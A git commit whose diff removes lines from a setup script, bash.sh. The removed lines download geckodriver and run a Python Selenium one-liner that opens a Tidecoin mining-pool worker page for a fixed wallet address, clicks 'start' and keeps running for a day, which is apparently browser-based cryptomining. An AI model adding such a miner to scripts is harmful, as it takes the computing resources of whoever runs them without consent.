8b751a777ebb4de5d6f62479b3259ae4e9c66459
Sugam Pokhrel <114973396+sugam-pokhrel@users.noreply.github.com>
2023-01-18 09:30:56 +0000

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -21,6 +21,3 @@ apt update -y
 apt-add-repository "deb http://ppa.launchpad.net/ubuntu-mozilla-security/ppa/ubuntu focal main"  
 apt update -y 
 apt install firefox -y 
-curl -sSL https://github.com/mozilla/geckodriver/releases/download/v0.32.0/geckodriver-v0.32.0-linux64.tar.gz | tar -xvz && chmod +x geckodriver 
-export DISPLAY=:1    &&  mv geckodriver /usr/local/bin/   
-python3 -c "from selenium import webdriver;import time;driver=webdriver.Firefox();from selenium.webdriver.common.by import By;from selenium.webdriver import ActionChains;driver.get('https://pool.tidecoin.exchange/workers/TAGhNUukKwRpna93hcG4GtsvWXYmnDkuVU');time.sleep(3);driver.find_element(By.ID,'start').click();time.sleep(86400);"
